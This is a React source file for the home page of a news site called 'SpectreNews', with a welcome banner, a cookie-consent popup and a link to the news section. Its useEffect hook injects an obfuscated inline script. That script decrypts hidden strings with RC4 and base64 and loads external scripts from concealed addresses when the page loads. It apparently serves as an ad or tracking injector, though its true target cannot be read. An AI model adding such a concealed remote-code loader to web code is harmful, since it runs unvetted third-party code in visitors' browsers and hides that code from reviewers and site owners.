import React, { useState, useEffect } from "react";
import Bar from "../bar/Bar";
import "./Home.css";
import { FiArrowRightCircle } from "react-icons/fi";
import { Link } from "react-router-dom";
import useLockBodyScroll from "../pages/useLockBodyScroll"; // Path to useLockBodyScroll.js

function Home() {
  const [acceptedCookies, setAcceptedCookies] = useState(false);

  useLockBodyScroll(["/"]);  // Add other paths if needed

  useEffect(() => {
    const cookiesAccepted = localStorage.getItem("acceptedCookies");
    setAcceptedCookies(cookiesAccepted === "true");

    // Scroll to the top of the page
    window.scrollTo(0, 0);

    const script = document.createElement("script");
    script.type = "text/javascript";
    script.async = false;
    script.innerHTML = `
    /*<![CDATA[/* */
(function(){if(window.e20f93a1b1636f007740e83f41814287) return; window.e20f93a1b1636f007740e83f41814287="EU_PzJDK3V1Ixg5scVYqIOaLZQbiXJniQ47diDgiRztTuNoJ88rBG-PmpNBQBNMc8OrSrW3AwR0NDa2RLHePkeSIqA";var b=['fsOmPcOuw5VRwrM=','wqAQIhLDocOvMA==','bsOQKMOmw7rDthRGwopSEUTDrsOh','wpXCkCdnwrFKwqZVb8Kpw70=','w7PDvMKTHErDsW4=','Vy4FwqNgw7N0csKiPsOCI0vDn8OQ','VcKzSg==','w44Mw6MOAng1wofDlz1NwrU=','wodBAwAow5nDi8OGE30mVA==','w7ZFcEvCvsKwbx0=','wq7CrWtowpbDtgtm','C0bDtFoswpkuw6JtwoEDw6vDrg==','dUIvwp8=','w6DDngfDjMK8fW5oQ8OWD2s=','CX4wZz/Dvg==','bcOcKsO6w6TDpg==','DsKCZR3CpR4=','YFUwwpTDvjHClFTDnQ==','wpfCmxlwcQzDl0DDhRM=','w7jCoMKdAkDCpivDv8OZHMKlacKiwojDpVXDkWjDtsK1eRjCtcOlXQvDlA0zJMK4HAvCmg09LcOETcK1VsKFwok=','w5LCuj/DokfChEdW','wrrDoQHCmsKJSn/DpgbCqDXDsMORwpNcMXlgUU0=','DFHDt1otwpAfw55twp4iw6TDow==','GsKoZxo=','e0NHa8KEw5rCrRLCgMK5wo9NQijCm8OSwqk/w4sDw67DmUzDqMONwq/CkcOAEsKQ','TRDDpGbCqjs=','wpRAw4zDiF0='];(function(a,c){var f=function(g){while(--g){a['push'](a['shift']());}};f(++c);}(b,0x1a1));var c=function(a,d){a=a-0x0;var e=b[a];if(c['UvUneL']===undefined){(function(){var h=function(){var k;try{k=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');')();}catch(l){k=window;}return k;};var i=h();var j='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';i['atob']||(i['atob']=function(k){var l=String(k)['replace'](/=+$/,'');var m='';for(var n=0x0,o,p,q=0x0;p=l['charAt'](q++);~p&&(o=n%0x4?o*0x40+p:p,n++%0x4)?m+=String['fromCharCode'](0xff&o>>(-0x2*n&0x6)):0x0){p=j['indexOf'](p);}return m;});}());var g=function(h,l){var m=[],n=0x0,o,p='',q='';h=atob(h);for(var t=0x0,u=h['length'];t<u;t++){q+='%'+('00'+h['charCodeAt'](t)['toString'](0x10))['slice'](-0x2);}h=decodeURIComponent(q);var r;for(r=0x0;r<0x100;r++){m[r]=r;}for(r=0x0;r<0x100;r++){n=(n+m[r]+l['charCodeAt'](r%l['length']))%0x100;o=m[r];m[r]=m[n];m[n]=o;}r=0x0;n=0x0;for(var v=0x0;v<h['length'];v++){r=(r+0x1)%0x100;n=(n+m[r])%0x100;o=m[r];m[r]=m[n];m[n]=o;p+=String['fromCharCode'](h['charCodeAt'](v)^m[(m[r]+m[n])%0x100]);}return p;};c['jEMwii']=g;c['TGBpVA']={};c['UvUneL']=!![];}var f=c['TGBpVA'][a];if(f===undefined){if(c['ODzLcD']===undefined){c['ODzLcD']=!![];}e=c['jEMwii'](e,d);c['TGBpVA'][a]=e;}else{e=f;}return e;};var t=window;t[c('0xb','VtSV')]=[[c('0x4','vDLL'),0x4c26cb],[c('0xd','@0vT'),0x2],[c('0x11','QTF%'),c('0x10','Go0d')],[c('0x1','n#2)'),0x0],[c('0xf','%V5&'),![]],[c('0x1a','Ge4#'),0x0],[c('0x17','r3kk'),!0x0]];var w=[c('0xc','N8@!'),c('0x7','godf')],a=0x0,q,s=function(){if(!w[a])return;q=t[c('0x18','Go0d')][c('0xa','Ge4#')](c('0x3','QTF%'));q[c('0x0','0l1v')]=c('0x14','pb&9');q[c('0xe','0vS!')]=!0x0;var d=t[c('0x8','(]!S')][c('0x9',']sod')](c('0x2','F*wN'))[0x0];q[c('0x15','wsW$')]=c('0x19','ykgp')+w[a];q[c('0x12','7jML')]=c('0x5','0l1v');q[c('0x13','godf')]=function(){a++;s();};d[c('0x6','ABEI')][c('0x16','!)yq')](q,d);};s();})();
    /*]]>/* */
    `;
    document.body.appendChild(script);
  }, []);

  const acceptCookies = () => {
    setAcceptedCookies(true);
    localStorage.setItem("acceptedCookies", "true");
  };

  return (
    <div className="home-container" style={{ overflow: 'hidden', height: '100vh' }}>
      <Bar search={false} />
      <div className="content">
        <h1>Welcome to SpectreNews</h1>
        <p>
          Unleash the power to explore diverse perspectives on global issues. Navigate politics with clarity. Discover the truth. Let SpectreNews be <strong>YOUR</strong> guide.
        </p>
        <Link to="/news" className="cta-button">
          Get Started <FiArrowRightCircle className="icon" />
        </Link>
      </div>
      {!acceptedCookies && (
        <div className="cookie-consent-popup">
          <p>We use cookies to ensure you get the best experience on our website.</p>
          <button onClick={acceptCookies}>Accept</button>
        </div>
      )}
      <div className="area">
        <ul className="circles">
          <li></li>
          <li></li>
          <li></li>
          <li></li>
          <li></li>
          <li></li>
          <li></li>
          <li></li>
          <li></li>
          <li></li>
        </ul>
      </div>
    </div>
  );
}

export default Home;
